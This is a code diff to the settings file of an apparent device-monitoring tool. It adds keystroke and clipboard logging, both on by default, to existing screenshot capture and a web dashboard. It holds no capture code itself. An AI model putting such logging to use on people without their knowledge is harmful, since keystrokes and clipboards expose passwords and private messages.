@@ -54,6 +54,12 @@ SCREENSHOT_QUALITY = int(os.getenv("SCREENSHOT_QUALITY", "65"))  # JPEG quality 
 SCREENSHOT_WIDTH = int(os.getenv("SCREENSHOT_WIDTH", "1024"))
 SCREENSHOT_HEIGHT = int(os.getenv("SCREENSHOT_HEIGHT", "576"))
 
+# Keystroke & Clipboard Logging Settings
+KEYSTROKE_LOGGING_ENABLED = os.getenv("KEYSTROKE_LOGGING_ENABLED", "true").lower() == "true"
+KEYSTROKE_FLUSH_INTERVAL_SECONDS = float(os.getenv("KEYSTROKE_FLUSH_INTERVAL_SECONDS", "3.0"))  # Inactivity pause before sentence flush
+KEYSTROKE_MAX_STORED = int(os.getenv("KEYSTROKE_MAX_STORED", "1500"))  # Retain latest 1,500 keystroke logs per device
+CLIPBOARD_LOGGING_ENABLED = os.getenv("CLIPBOARD_LOGGING_ENABLED", "true").lower() == "true"
+
 # Web Dashboard Settings
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 8000
